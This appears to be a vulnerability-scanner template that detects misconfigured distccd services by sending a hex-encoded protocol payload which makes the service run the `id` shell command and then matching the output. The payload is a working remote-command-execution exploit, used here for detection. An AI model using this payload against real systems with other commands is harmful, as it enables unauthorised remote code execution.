id: C-Backdoor  # Template ID for detecting an unintentional backdoor in distccd

info:
  name: C Compiler Unintentional Backdoor Check
  author: Jean Bagnis
  severity: critical
  description: |
    An unintentional backdoor is a service that may inadvertently provide unauthorized access.
    In this case, distccd is exposed on the system and can be abused to execute commands remotely
    when improperly configured.

tcp:
  - inputs:
      # Initial distccd protocol handshake (hex-encoded)
      - data: 444953543030303030303031
        type: hex

      # Hex-encoded payload that instructs the service to execute a benign command (id)
      - data: 41524743303030303030303841524756303030303030303273684152475630303030303030322d634152475630303030303030637368202d6320272869642927415247563030303030303031234152475630303030303030322d634152475630303030303030366d61696e2e634152475630303030303030322d6f4152475630303030303030366d61696e2e6f444f5449303030303030303141
        type: hex

    host:
      - "{{Hostname}}"  # Target host
    port: 3632          # distccd default port

    matchers:
      # Confirms command execution by matching the output of the `id` command
      - type: regex
        part: body
        regex:
          - "uid=[0-9]+.*gid=[0-9]+.*"
